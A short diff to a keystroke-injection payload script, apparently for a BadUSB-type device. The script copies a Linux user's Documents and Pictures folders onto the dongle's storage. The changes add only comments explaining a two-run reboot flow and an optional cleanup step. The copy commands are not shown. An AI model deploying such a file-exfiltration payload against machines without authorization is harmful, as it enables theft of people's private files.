@@ -1,6 +1,8 @@
 REM ============================================================
 REM Linux: exfil Documents + Pictures to the dongle
-REM REQUIRES: USB_STORAGE enabled (issued below). The card mounts
+REM TWO-RUN FLOW: run 1 enables USB storage and the DEVICE REBOOTS
+REM (that is normal - the USB descriptor only changes at boot). Run the
+REM script a SECOND time: the enable becomes a no-op and the copy runs. The card mounts
 REM at /media/$USER/DISK (Debian/Ubuntu) or /run/media/$USER/DISK
 REM (Fedora/Arch); both are tried. Copied into <mount>/exfil.
 REM AUTHORIZED USE ONLY.
@@ -16,4 +18,5 @@ DELAY 400
 LED_BLINK 5 #FFD600
 SCREEN_TEXT exfil done #FFD600
 LOG linux_exfil_documents: copy issued
+REM Optional cleanup - run when done (device reboots):
 REM USB_STORAGE disable
